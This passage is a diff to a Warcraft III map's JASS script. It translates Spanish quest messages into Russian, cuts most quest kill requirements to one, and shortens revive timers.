+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Ed takes nothing returns boolean
@@ -5555,8 +6743,8 @@ set re[ee]=false
 set ie[ee]="Criaturas"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=40
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="criaturas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5568,9 +6756,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Xd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Id takes nothing returns boolean
@@ -5588,8 +6776,8 @@ set re[ee]=false
 set ie[ee]="Mayor"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$F
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="mayor."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5601,9 +6789,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(Ad())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Bd takes nothing returns boolean
@@ -5621,8 +6809,8 @@ set re[ee]=false
 set ie[ee]="Oso Chaman"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=25
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="osos."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5634,9 +6822,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(cd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Dd takes nothing returns boolean
@@ -5654,8 +6842,8 @@ set re[ee]=false
 set ie[ee]="Sirenas"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=10
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="sirenas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5667,9 +6855,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(fd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Gd takes nothing returns boolean
@@ -5687,8 +6875,8 @@ set re[ee]=false
 set ie[ee]="Espectros de Sombra"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=60
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="sombras."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5700,9 +6888,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(hd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Jd takes nothing returns boolean
@@ -5720,8 +6908,8 @@ set re[ee]=false
 set ie[ee]="Reina"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=5
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="reina."
 set Re[ee]=0
 set Ie[ee]=20
@@ -5733,9 +6921,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(kd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Ld takes nothing returns boolean
@@ -5753,8 +6941,8 @@ set re[ee]=false
 set ie[ee]="Satiro"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=5
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="satiro."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5766,9 +6954,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(md())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Pd takes nothing returns boolean
@@ -5786,8 +6974,8 @@ set re[ee]=false
 set ie[ee]="Aquiles Force"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="kills mas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5799,9 +6987,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(qd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Sd takes nothing returns boolean
@@ -5819,8 +7007,8 @@ set re[ee]=false
 set ie[ee]="Hector Force"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="kills mas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5832,9 +7020,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(td())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Ud takes nothing returns boolean
@@ -5852,8 +7040,8 @@ set re[ee]=false
 set ie[ee]="Perseo Force"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="kills mas."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5865,9 +7053,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(wd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Yd takes nothing returns boolean
@@ -5885,8 +7073,8 @@ set re[ee]=false
 set ie[ee]="Satiro Bestial"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=10
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="satiro bestial."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5898,9 +7086,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan:g "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(zd())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function eD takes nothing returns boolean
@@ -5918,8 +7106,8 @@ set re[ee]=false
 set ie[ee]="Armadura de Semidios Completa"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="mayores."
 set Re[ee]=0
 set Ie[ee]=0
@@ -5931,9 +7119,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(xD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function iD takes nothing returns boolean
@@ -5954,8 +7142,8 @@ set re[ee]=false
 set ie[ee]="Golden Gods Gema"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSkeletonMage.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=2
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Thantos"
 set Re[ee]=0
 set Ie[ee]=0
@@ -5967,9 +7155,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function ZeusArmorCondition takes nothing returns boolean
@@ -5984,7 +7172,7 @@ set re[ee]=false
 set ie[ee]="Armadura vieja de Zeus"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNLichKing.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
+set Ve[ee]="Приходите и получите награду."
 set Ee[ee]=1
 set Xe[ee]="Evil Zeus"
 set Re[ee]=0
@@ -5997,9 +7185,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Armor16Condition takes nothing returns boolean
@@ -6014,8 +7202,8 @@ set re[ee]=false
 set ie[ee]="Armadura Deluxe"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNCryptFiend.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Cria de Urano"
 set Re[ee]=0
 set Ie[ee]=0
@@ -6027,9 +7215,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Armor17Condition takes nothing returns boolean
@@ -6044,8 +7232,8 @@ set re[ee]=false
 set ie[ee]="Armadura del Super Guerrero"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBeastMaster.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=7
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Chatis"
 set Re[ee]=0
 set Ie[ee]=0
@@ -6057,9 +7245,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Armor18Condition takes nothing returns boolean
@@ -6074,7 +7262,7 @@ set re[ee]=false
 set ie[ee]="Armadura de Titanes"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSummonWaterElemental.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
+set Ve[ee]="Приходите и получите награду."
 set Ee[ee]=1
 set Xe[ee]="Oceano"
 set Re[ee]=0
@@ -6087,9 +7275,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function ExExpCondition takes nothing returns boolean
@@ -6101,36 +7289,6 @@ endfunction
 function ExExpAction takes nothing returns nothing
 set mv=GetUnitLevel(GetDyingUnit())
 set Mv[(1+GetPlayerId(GetOwningPlayer(GetKillingUnitBJ())))]=(Mv[(1+GetPlayerId(GetOwningPlayer(GetKillingUnitBJ())))]+mv)
-endfunction
-function Armor20Condition takes nothing returns boolean
-return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I0B1')
-endfunction
-function Armor20Action takes nothing returns nothing
-set ee=(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))
-set xe[ee]=GetTriggerUnit()
-set oe[ee]=GetOwningPlayer(xe[ee])
-set ve[ee]=true
-set re[ee]=false
-set ie[ee]="Armadura de Dragon"
-set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBronzeDragon.blp"
-set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
-set Xe[ee]="Ladon"
-set Re[ee]=0
-set Ie[ee]=0
-set Ae[ee]='I0AC'
-set Ne[ee]='n03K'
-set be[ee]=false
-call CreateQuestBJ(0,(ie[ee]+(" ("+(GetPlayerName(oe[ee])+")"))),ne[ee],ae[ee])
-set Be[ee]=bj_lastCreatedQuest
-call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
-call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
-if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
-else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
-endif
 endfunction
 function Armor19Condition takes nothing returns boolean
 return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I0AI')
@@ -6144,8 +7302,8 @@ set re[ee]=false
 set ie[ee]="Armadura de Dioses"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNNagaMyrmidonRoyalGuard.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=3
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Poseidon"
 set Re[ee]=0
 set Ie[ee]=0
@@ -6157,9 +7315,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function BoxQuestCondition takes nothing returns boolean
@@ -6174,7 +7332,7 @@ set re[ee]=false
 set ie[ee]="Level Box - Titan"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNFleshGolem.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
+set Ve[ee]="Приходите и получите награду."
 set Ee[ee]=1
 set Xe[ee]="Crono"
 set Re[ee]=0
@@ -6187,9 +7345,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Super1Condition takes nothing returns boolean
@@ -6204,7 +7362,7 @@ set re[ee]=false
 set ie[ee]="SuperHuman job - Part One"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBeastMaster.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
+set Ve[ee]="Приходите и получите награду."
 set Ee[ee]=1
 set Xe[ee]="Atlas: SuperHuman"
 set Re[ee]=0
@@ -6217,9 +7375,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function Super2Condition takes nothing returns boolean
@@ -6234,7 +7392,7 @@ set re[ee]=false
 set ie[ee]="SuperHuman job - Part Two"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNRockGolem.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
+set Ve[ee]="Приходите и получите награду."
 set Ee[ee]=1
 set Xe[ee]="Prometeo: SuperHuman"
 set Re[ee]=0
@@ -6247,9 +7405,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function nD takes nothing returns nothing
@@ -6261,8 +7419,8 @@ set re[ee]=false
 set ie[ee]="Armadura de Aquiles"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSpy.blp"
 set ne[ee]="Elimina la cantidad indicada"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=2
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Aquiles"
 set Re[ee]=0
 set Ie[ee]=0
@@ -6274,9 +7432,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(aD())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function ED takes nothing returns boolean
@@ -6411,7 +7569,7 @@ function kD takes nothing returns boolean
 return(GetEventDamage()>=.01)
 endfunction
 function KD takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function lD takes nothing returns boolean
 return(GetUnitAbilityLevelSwapped('A03F',GetEventDamageSource())==1)
@@ -6495,7 +7653,7 @@ endfunction
 function sD takes nothing returns nothing
 call CreateTimerDialogBJ(U,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set w=bj_lastCreatedTimerDialog
-call StartTimerBJ(U,false,15.)
+call StartTimerBJ(U,false,3.)
 call TimerDialogDisplay(w,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6507,7 +7665,7 @@ endfunction
 function TD takes nothing returns nothing
 call CreateTimerDialogBJ(W,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set y=bj_lastCreatedTimerDialog
-call StartTimerBJ(W,false,15.)
+call StartTimerBJ(W,false,3.)
 call TimerDialogDisplay(y,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6519,7 +7677,7 @@ endfunction
 function wD takes nothing returns nothing
 call CreateTimerDialogBJ(Y,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set Z=bj_lastCreatedTimerDialog
-call StartTimerBJ(Y,false,15.)
+call StartTimerBJ(Y,false,3.)
 call TimerDialogDisplay(Z,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6531,7 +7689,7 @@ endfunction
 function YD takes nothing returns nothing
 call CreateTimerDialogBJ(vv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set ev=bj_lastCreatedTimerDialog
-call StartTimerBJ(vv,false,15.)
+call StartTimerBJ(vv,false,3.)
 call TimerDialogDisplay(ev,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6543,7 +7701,7 @@ endfunction
 function vf takes nothing returns nothing
 call CreateTimerDialogBJ(xv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set ov=bj_lastCreatedTimerDialog
-call StartTimerBJ(xv,false,15.)
+call StartTimerBJ(xv,false,3.)
 call TimerDialogDisplay(ov,true)
